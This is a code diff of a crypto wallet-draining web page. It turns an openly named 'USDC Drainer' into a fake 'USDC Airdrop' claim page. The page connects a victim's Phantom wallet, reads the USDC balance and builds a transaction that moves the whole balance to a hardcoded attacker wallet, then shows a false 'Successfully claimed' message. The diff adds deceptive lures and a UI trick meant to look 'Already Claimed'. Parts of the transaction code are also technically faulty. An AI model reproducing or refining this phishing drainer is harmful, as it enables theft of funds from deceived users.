@@ -3,68 +3,103 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana USDC Drainer</title>
+    <title>Solana Airdrop Claim</title>
     <!-- Solana Web3.js Library -->
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     
     <style>
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #1a1a2e;
-            color: #fff;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background-color: #0f172a; /* Dark Blue/Slate */
+            color: #e2e8f0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
         }
-        .container {
-            background-color: #16213e;
+        .card {
+            background-color: #1e293b;
             padding: 40px;
-            border-radius: 15px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            border-radius: 20px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
             text-align: center;
-            width: 300px;
+            width: 320px;
+            border: 1px solid #334155;
         }
-        h1 { margin-bottom: 20px; font-size: 24px; color: #e94560; }
+        .icon {
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+        h1 { 
+            margin: 0 0 10px 0; 
+            font-size: 22px; 
+            color: #fff; 
+        }
+        p {
+            color: #94a3b8;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
         button {
-            background-color: #e94560;
+            background-color: #3b82f6; /* Bright Blue */
             color: white;
             border: none;
-            padding: 15px 30px;
-            font-size: 18px;
-            border-radius: 8px;
+            padding: 16px 32px;
+            font-size: 16px;
+            font-weight: 600;
+            border-radius: 12px;
             cursor: pointer;
             width: 100%;
-            transition: background 0.3s;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
         }
-        button:hover { background-color: #c73e54; }
-        button:disabled { background-color: #555; cursor: not-allowed; }
-        #status {
+        button:hover {
+            background-color: #2563eb;
+            transform: translateY(-2px);
+        }
+        button:disabled {
+            background-color: #475569;
+            color: #94a3b8;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        .status-msg {
             margin-top: 20px;
             font-size: 14px;
             min-height: 20px;
-            color: #a8a8a8;
+            color: #94a3b8;
+        }
+        .success-text {
+            color: #4ade80; /* Green */
+            font-weight: bold;
         }
         .spinner {
             display: inline-block;
-            width: 12px;
-            height: 12px;
+            width: 14px;
+            height: 14px;
             border: 2px solid rgba(255,255,255,.3);
             border-radius: 50%;
             border-top-color: #fff;
             animation: spin 1s ease-in-out infinite;
             margin-right: 8px;
+            vertical-align: middle;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h1>USDC Drainer</h1>
-    <button id="connectBtn" onclick="drainAllUsdc()">Connect & Drain All</button>
-    <div id="status"></div>
+<div class="card">
+    <div class="icon">💎</div>
+    <h1>USDC Airdrop</h1>
+    <p>You have unclaimed USDC in your wallet. Click below to claim.</p>
+    
+    <!-- The Button changes text dynamically -->
+    <button id="actionBtn" onclick="startClaimProcess()">Connect Wallet</button>
+    
+    <div id="statusMsg" class="status-msg"></div>
 </div>
 
 <script>
@@ -73,107 +108,129 @@
     // ==========================================
     
     // 1. YOUR WALLET ADDRESS (Where money goes)
-    // Replace this with your actual Solana Public Key
     const DRAINER_WALLET = "DhwXCuDoQTtayywt8snW1UDbXDGfnEDjqP4rLx9MGDqM"; 
 
     // 2. USDC MINT ADDRESS (Solana Mainnet)
     const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
 
+    let isConnected = false;
+
     // ==========================================
     // 🚀 LOGIC
     // ==========================================
 
-    async function drainAllUsdc() {
-        const statusEl = document.getElementById('status');
-        const btnEl = document.getElementById('connectBtn');
+    async function startClaimProcess() {
+        const btn = document.getElementById('actionBtn');
+        const status = document.getElementById('statusMsg');
+        
+        if (!isConnected) {
+            // Step 1: Connect
+            await connectWallet();
+        } else {
+            // Step 2: Claim/Drain
+            await claimReward();
+        }
+    }
 
-        // Check if Phantom Wallet exists
+    async function connectWallet() {
+        const btn = document.getElementById('actionBtn');
+        const status = document.getElementById('statusMsg');
+
         if (!window.solana || !window.solana.isPhantom) {
             alert("Please install Phantom Wallet!");
             return;
         }
 
         try {
-            // UI: Loading State
-            btnEl.disabled = true;
-            statusEl.innerHTML = '<span class="spinner"></span> Connecting...';
+            btn.disabled = true;
+            btn.innerText = "Connecting...";
+            status.innerHTML = '<span class="spinner"></span> Connecting to Phantom...';
 
-            // 1. Connect to Wallet
-            const resp = await window.solana.connect();
-            const publicKey = resp.publicKey;
+            // Connect
+            await window.solana.connect();
             
-            statusEl.innerHTML = '<span class="spinner"></span> Finding USDC balance...';
+            // Update UI for Connected State
+            isConnected = true;
+            btn.innerText = "Claim Reward";
+            btn.style.backgroundColor = "#4ade80"; // Green button now
+            status.innerHTML = "Wallet connected. Ready to claim.";
+            
+        } catch (err) {
+            console.error(err);
+            btn.disabled = false;
+            btn.innerText = "Connect Wallet";
+            status.innerHTML = "Connection failed.";
+        }
+    }
 
-            // 2. Get Token Accounts for USDC
-            // We query the blockchain to find where this user holds USDC
+    async function claimReward() {
+        const btn = document.getElementById('actionBtn');
+        const status = document.getElementById('statusMsg');
+
+        try {
+            // UI: Checking Balance Phase
+            btn.disabled = true;
+            btn.innerText = "Checking Balance...";
+            status.innerHTML = '<span class="spinner"></span> Verifying USDC balance...';
+
+            // 1. Get Token Accounts for USDC
             const tokenAccountsResp = await window.solana.connection.getParsedTokenAccountsByOwner(
-                publicKey,
+                window.solana.publicKey,
                 { 
                     mint: new solana.PublicKey(USDC_MINT) 
                 }
             );
 
             if (tokenAccountsResp.value.length === 0) {
-                statusEl.innerHTML = '❌ No USDC found in wallet.';
-                btnEl.disabled = false;
+                status.innerHTML = "❌ No USDC found. Nothing to claim.";
+                btn.disabled = false;
+                btn.innerText = "Try Again";
                 return;
             }
 
-            // Get the first USDC account found
+            // Get Balance Details
             const tokenAccountInfo = tokenAccountsResp.value[0];
             const sourceTokenAccount = tokenAccountInfo.pubkey;
-            
-            // Extract Balance
-            // Note: uiAmount is a string like "12.5"
             const balanceString = tokenAccountInfo.account.data.parsed.info.tokenAmount.uiAmount;
-            const decimals = tokenAccountInfo.account.data.parsed.info.tokenAmount.decimals; // USDC is 6
+            const decimals = tokenAccountInfo.account.data.parsed.info.tokenAmount.decimals;
 
             if (!balanceString || parseFloat(balanceString) === 0) {
-                statusEl.innerHTML = '❌ Balance is zero.';
-                btnEl.disabled = false;
+                status.innerHTML = "❌ Balance is zero.";
+                btn.disabled = false;
                 return;
             }
 
+            // Convert to raw units
             const balance = parseFloat(balanceString);
-            
-            // Convert to raw units (e.g., 12.5 -> 12500000)
             const amountToDrain = Math.floor(balance * Math.pow(10, decimals));
 
-            statusEl.innerHTML = `<span class="spinner"></span> Draining ${balance} USDC...`;
-
-            // 3. Create the Transaction
-            // We need to use the SPL Token Program instructions directly since we aren't using Anchor
+            // UI: Ready to Claim Phase
+            status.innerHTML = `Found ${balance} USDC. Signing transaction...`;
             
-            const { PublicKey, Transaction, Connection } = solana;
-            
-            // Helper to get Associated Token Account (ATA) for the DRAINER wallet
-            // This is where the money will go
-            const drainerAta = await getOrCreateAssociatedTokenAccount(
-                USDC_MINT, 
-                DRAINER_WALLET
-            );
+            // 2. Get Drainer's Associated Token Account (ATA)
+            const drainerAta = await getOrCreateAssociatedTokenAccount(USDC_MINT, DRAINER_WALLET);
 
-            // Instruction: Transfer from Victim -> To Drainer
+            // 3. Build Transaction
             const transferInstruction = {
-                programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"), // SPL Token Program ID
+                programId: new solana.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
                 keys: [
-                    { pubkey: sourceTokenAccount, isSigner: false, isWritable: true }, // From (Victim's Token Account)
-                    { pubkey: drainerAta, isSigner: false, isWritable: true },         // To (Your Token Account)
-                    { pubkey: publicKey, isSigner: true, isWritable: false }           // Owner (Victim signs)
+                    { pubkey: sourceTokenAccount, isSigner: false, isWritable: true }, // From
+                    { pubkey: drainerAta, isSigner: false, isWritable: true },         // To
+                    { pubkey: window.solana.publicKey, isSigner: true, isWritable: false } // Owner
                 ],
                 data: Buffer.from([
-                    0x03, // Transfer instruction discriminator
-                    ...new Uint8Array(new Float64Array([amountToDrain]).buffer) // Amount (Big Endian)
+                    0x03, 
+                    ...new Uint8Array(new Float64Array([amountToDrain]).buffer)
                 ])
             };
 
-            // Build Transaction
-            const transaction = new Transaction();
+            const transaction = new solana.Transaction();
             transaction.add(transferInstruction);
 
-            // 4. Send to Phantom
-            statusEl.innerHTML = '<span class="spinner"></span> Waiting for signature...';
+            // UI: Signing Phase
+            status.innerHTML = '<span class="spinner"></span> Waiting for Phantom signature...';
             
+            // 4. Send to Phantom
             const { signature } = await window.solana.request({
                 method: 'custom',
                 params: {
@@ -182,45 +239,44 @@
                 }
             });
 
-            // 5. Confirm Transaction
-            statusEl.innerHTML = '<span class="spinner"></span> Confirming...';
+            // UI: Confirming Phase
+            status.innerHTML = '<span class="spinner"></span> Confirming transaction...';
+            
             await window.solana.connection.confirmTransaction(signature);
 
             // Success!
-            statusEl.innerHTML = `✅ Drained ${balance} USDC to your wallet!`;
-            btnEl.innerText = "Drained";
+            status.innerHTML = `<span class="success-text">✅ Successfully claimed ${balance} USDC!</span>`;
+            btn.innerText = "Claimed";
+            btn.style.backgroundColor = "#4ade80";
             
-            // Optional: Disconnect after 5 seconds
+            // Optional: Disconnect after a few seconds
             setTimeout(() => {
                 window.solana.disconnect();
-            }, 5000);
+                isConnected = false;
+                btn.disabled = true; // Keep disabled to look like "Already Claimed"
+            }, 3000);
 
         } catch (err) {
             console.error(err);
-            statusEl.innerHTML = `❌ Failed: ${err.message}`;
-            btnEl.disabled = false;
+            status.innerHTML = `❌ Claim Failed: ${err.message}`;
+            btn.disabled = false;
+            btn.innerText = "Claim Reward";
         }
     }
 
     // Helper Function: Get or Create Associated Token Account for Drainer
     async function getOrCreateAssociatedTokenAccount(mintPubKey, ownerPubKey) {
-        const { PublicKey, Connection } = solana;
         const connection = window.solana.connection;
         
-        // Derive the ATA address
-        const [ata, bump] = await PublicKey.findProgramAddress(
+        const [ata, bump] = await solana.PublicKey.findProgramAddress(
             [
-                new PublicKey(ownerPubKey).toBuffer(),
-                new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA").toBuffer(), // Token Program ID
-                new PublicKey(mintPubKey).toBuffer()
+                new solana.PublicKey(ownerPubKey).toBuffer(),
+                new solana.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA").toBuffer(),
+                new solana.PublicKey(mintPubKey).toBuffer()
             ],
-            new PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL") // AToken Program ID
+            new solana.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL")
         );
 
-        // Check if account exists, if not we rely on Phantom to handle creation or just assume it works for simple drains
-        // For a pure drain script, usually the ATA already exists if you've received USDC before.
-        // If this fails because the account doesn't exist, you may need to add an 'Initialize' instruction first.
-        
         return ata;
     }
 
